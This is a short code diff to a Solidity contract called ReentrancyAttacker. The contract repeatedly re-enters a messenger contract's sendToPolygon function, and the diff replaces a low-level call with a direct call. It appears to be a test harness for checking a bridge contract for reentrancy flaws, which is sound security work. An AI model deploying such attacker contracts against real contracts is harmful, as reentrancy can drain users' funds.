@@ -21,11 +21,8 @@ contract ReentrancyAttacker {
         require(initialized, "Contract not initialized");
         if (attackCount < 2 && address(this).balance >= ATTACK_VALUE) {
             attackCount++;
-            // Try to reenter through sendToPolygon using low-level call
-            (bool success,) = address(messenger).call{value: ATTACK_VALUE}(
-                abi.encodeWithSignature("sendToPolygon(address)", address(this))
-            );
-            require(success, "Reentry attempt failed");
+            // Attempt direct reentry into sendToPolygon
+            messenger.sendToPolygon{value: ATTACK_VALUE}(address(this));
         }
     }
 
@@ -33,6 +30,7 @@ contract ReentrancyAttacker {
         require(initialized, "Contract not initialized");
         require(msg.value >= ATTACK_VALUE, "Need at least 1 ETH");
         attackCount = 0;
+        // Initial call to trigger the attack
         messenger.sendToPolygon{value: ATTACK_VALUE}(address(this));
     }
 }
